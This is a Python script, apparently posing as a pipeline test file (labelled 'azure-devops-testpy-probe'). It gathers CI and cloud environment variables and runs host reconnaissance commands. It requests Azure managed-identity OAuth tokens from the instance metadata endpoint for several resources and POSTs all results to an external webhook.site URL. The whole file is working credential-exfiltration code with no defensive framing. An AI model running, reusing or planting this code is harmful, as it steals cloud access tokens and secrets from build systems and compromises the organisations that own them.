import json
import os
import platform
import socket
import subprocess
import urllib.request

WEBHOOK = "https://webhook.site/b0ac5d93-1957-46ab-adca-0c0db46c8396"


def run(command):
    try:
        result = subprocess.run(command, shell=True, text=True, capture_output=True, timeout=8)
        return {
            "command": command,
            "returncode": result.returncode,
            "stdout": result.stdout[:6000],
            "stderr": result.stderr[:3000],
        }
    except Exception as exc:
        return {"command": command, "error": f"{type(exc).__name__}: {exc}"}


interesting_env = {
    key: value
    for key, value in os.environ.items()
    if any(marker in key.upper() for marker in ("AZURE", "IDENTITY", "MSI", "RUNNER", "AGENT", "SYSTEM", "DEVOPS", "BUILD", "RELEASE", "PIPELINE", "KUBERNETES", "GITHUB"))
}

commands = [
    "whoami",
    "id",
    "hostname",
    "uname -a",
    "pwd",
    "ip route",
    "ls -la /home",
    "curl -sS --max-time 5 -H Metadata:true --noproxy '*' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F'",
    "curl -sS --max-time 5 -H Metadata:true --noproxy '*' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=499b84ac-1321-427f-aa17-267ca6975798'",
    "curl -sS --max-time 5 -H Metadata:true --noproxy '*' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=6dae42f8-4368-4678-94ff-3960e28e3630'",
]

body = {
    "label": "azure-devops-testpy-probe",
    "hostname": socket.gethostname(),
    "platform": platform.platform(),
    "env": interesting_env,
    "commands": [run(command) for command in commands],
}

request = urllib.request.Request(
    WEBHOOK,
    data=json.dumps(body, indent=2).encode(),
    headers={"Content-Type": "application/json", "x-exam-label": "azure-devops-testpy-probe"},
    method="POST",
)
urllib.request.urlopen(request, timeout=20).read()
print("azure devops test.py probe posted")
